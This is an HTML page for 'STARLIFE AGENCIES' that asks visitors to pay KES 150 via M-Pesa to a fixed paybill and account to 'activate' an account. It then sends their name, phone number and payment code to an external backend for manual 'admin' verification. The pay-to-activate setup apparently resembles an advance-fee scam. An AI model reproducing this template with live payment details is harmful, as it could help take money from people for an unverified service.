<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>STARLIFE AGENCIES</title><style>body{background:#0a0a0a;color:#fff;font-family:Arial;margin:0}.h{padding:12px;background:#111;border-bottom:2px solid #ffcc00}.logo{color:#ffcc00;font-weight:bold;font-size:20px}.main{padding:16px;max-width:500px;margin:auto}.c{background:#151515;border:1px solid #333;border-radius:12px;padding:16px}.payBox{background:#1a1a0a;border:1px solid #ffcc00;border-radius:10px;padding:14px;text-align:center;line-height:1.8}.mpesaBox{background:#0f1f0f;border-radius:8px;padding:12px;margin-top:12px}input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:8px;background:#222;color:#fff;box-sizing:border-box}button{width:100%;padding:14px;border:none;border-radius:8px;font-weight:bold;font-size:16px;cursor:pointer;margin-top:8px}.btn-pay{background:#00a651;color:#fff}#msg{text-align:center;font-weight:bold;margin-top:12px;display:none}.amount{color:#00ff66;font-size:22px;font-weight:bold}</style></head><body><div class="h"><div class="logo">★ STARLIFE AGENCIES</div></div><div class="main"><div class="c"><div style="text-align:center;color:#ffcc00;font-weight:bold;font-size:20px;margin-bottom:12px">ACTIVATE ACCOUNT</div><div class="payBox"><b>LIPA NA M-PESA</b><br>Paybill: <b>714777</b><br>Account: <b>440200282954</b><br>Amount: <span class="amount">KES 150</span></div><div class="mpesaBox"><input id="name" placeholder="Your Full Name"><input id="phone" placeholder="M-Pesa Phone 07..."><input id="code" placeholder="M-Pesa Code e.g QGH7..."><button class="btn-pay" onclick="submitCode()">SUBMIT CODE & ACTIVATE</button><div id="msg"></div><div style="text-align:center;color:#aaa;font-size:12px;margin-top:8px">Admin will verify in 2 minutes</div></div></div></div><script>const API="https://starlife-mpesa-backend.vercel.app";async function submitCode(){const name=document.getElementById('name').value.trim();const phone=document.getElementById('phone').value.trim();const code=document.getElementById('code').value.trim();const msg=document.getElementById('msg');if(!name||!phone||!code){msg.style.display='block';msg.style.color='#ff4444';msg.innerText='Jaza kila kitu!';return}msg.style.display='block';msg.style.color='#ffcc00';msg.innerText='Sending...';try{const r=await fetch(API+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,phone,code})});const d=await r.json();if(d.success){msg.style.color='#00ff66';msg.innerText='✅ Submitted! Admin will verify.';document.getElementById('name').value='';document.getElementById('phone').value='';document.getElementById('code').value='';}else{msg.style.color='#ff4444';msg.innerText='Error';}}catch(e){msg.style.color='#ff4444';msg.innerText='Network error';}}</script></body></html>
